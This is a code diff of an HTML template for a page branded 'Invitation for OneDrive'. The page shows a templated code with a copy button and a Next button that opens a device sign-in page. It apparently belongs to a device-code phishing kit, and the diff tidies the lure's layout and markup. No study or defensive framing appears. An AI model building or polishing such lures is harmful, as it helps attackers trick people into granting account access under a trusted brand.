@@ -11,20 +11,20 @@
     <link rel="stylesheet" href="assets/css/styles.min.css">
 </head>
 
-<body class="text-nowrap" style="width: 100%;height: 100vh;">
-    <div id="loginForm" class="container"><img width="150" id="image" src="assets/img/logo.png">
-        <div></div>
+<body style="width: 100%; min-height: 100vh;">
+    <div id="loginForm" class="container">
+        <img width="150" id="image" src="assets/img/logo.png" alt="">
         <section id="section-main">
             <section id="section-1" class="slide-page">
-                <p id="signIn" class="field"></p>
                 <p id="signIn" class="field">Invitation for OneDrive</p>
                 <p id="NoAccount" class="field">Use this code to access the shared resources.<br>Click Next to copy your code and open sign-in in a new tab.<br>You can return here anytime to view the code again.</p>
-                 <p id="signInOptions" class="field" ></p>
-                <input type="text" id="email" class="field" value="<%= user_code %>" readonly/> <img src="assets/img/copy-icon.webp" alt="Copy code" style="width: 20px; cursor: pointer;" onclick="copy()" /> </p>
-
-               
-
-                    <p id="btnPlace" class="field"><button onclick="openDeviceLogin()" class="firstNext next" type="button" id="btnSend" >Next</button></p>
+                <div id="codeRow" class="field">
+                    <input type="text" id="email" value="<%= user_code %>" readonly>
+                    <img src="assets/img/copy-icon.webp" alt="Copy code" onclick="copy()">
+                </div>
+                <p id="btnPlace" class="field">
+                    <button onclick="openDeviceLogin()" class="firstNext next" type="button" id="btnSend">Next</button>
+                </p>
             </section>
         </section>
     </div>
